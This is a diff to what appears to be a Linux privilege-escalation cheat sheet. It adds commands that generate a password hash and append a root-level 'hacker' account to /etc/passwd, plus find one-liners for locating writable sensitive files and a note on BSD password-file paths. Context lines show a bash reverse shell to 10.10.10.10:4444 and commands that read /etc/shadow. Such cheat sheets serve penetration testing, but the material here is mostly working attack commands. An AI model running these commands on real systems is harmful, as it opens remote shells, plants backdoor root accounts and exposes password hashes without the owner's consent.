@@ -122,12 +122,19 @@ bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 ```bash
 cat /etc/passwd | cut -d: -f1 | awk -F: '($3 == "0") {print}' /etc/passwd
 ls -la /etc/shadow | cat /etc/shadow
+# For /etc/passwd use one of the below
+openssl passwd -1 -salt hacker hacker
+mkpasswd -m SHA-512 hacker
+python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
+# Then
+echo 'hacker:$GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash' >>/etc/passwd
 ```
-**EDIT NOTE **probably better in persistence/backdoor areas as this seems rare writable /etc/passwd
+NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`.
 
+## Weak sensitive files permissions
 ```bash
-openssl passwd newpasswordhere # Add a new root for passwd
-mkpasswd -m sha-512 newpasswordhere # Add a new root for shadow
+find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
+for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
 ```
 
 #### User-key related
